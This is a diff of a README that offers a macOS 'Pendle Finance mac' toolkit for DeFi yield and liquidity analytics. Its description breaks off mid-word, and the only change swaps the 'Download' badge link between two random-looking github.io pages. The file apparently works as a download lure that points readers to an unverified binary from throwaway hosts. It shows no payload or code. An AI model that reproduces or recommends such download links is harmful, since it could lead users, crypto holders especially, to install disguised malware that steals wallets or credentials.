@@ -2,7 +2,7 @@
 
 Pendle Finance mac on macOS — toolkit for yield tokenization interface, liquidity pools & amm, and apr/apy analytics with native integrations for crea
 
-[![Download Pendle Finance mac](https://img.shields.io/badge/Download-Pendle_Finance_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Pendle Finance mac](https://img.shields.io/badge/Download-Pendle_Finance_mac-blueviolet)](https://clairmontdinkel17.github.io/.github/Pendle-Finance)
 
 ---
 
